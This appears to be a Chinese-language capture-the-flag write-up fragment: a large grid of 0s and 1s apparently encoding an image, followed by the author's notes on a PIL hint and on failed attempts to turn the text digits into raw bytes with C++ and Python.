0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 
0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 
0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 
0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 
0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 
1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 
0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 
0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 
0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 
0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 
1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0
0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 
0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
```

由于最后成功的提示是："you can go furthur with 'import image from PIL'" ，因此我以为这是某张图片的"字节数据"，所以研究了好久如何将文本数据的10直接塞到字节位中，后来发现不仅麻烦，而且这题也不是这个意思。

`ios::binary` 以二进制文件格式打开文件，多种方式的连接：`ios::out | ios::binary` 。输入数据时指定数据地址的起点与大小，并源数据地址上的内容添加到目标地址。

在此吐槽一下字节数据问题，我发现实现文本的01直接原样化为二进制下字节各位的值居然这么困难...甚至找不到一些好的办法实现。最后的想法是利用python中的字符串转字节的快捷语法 `b'str'` ，通过C++将二进制数据转化为十六进制并添加前缀 `\x` 得到字符串输入python中转化为字节流实现，但是效果很不理想，而事实上本题也不是这个意思。虽然但是，这个确实很有说法，除了010editor中的脚本快捷输入外，是否还有别的办法将文本形态的01字节流直接转化为字节形态的数据呢？（文本的 `01` 的十六进制字节数据是两个字节的 `00 01` ）。PIL是Python2的版本，Python3已经更新为Pillow了。

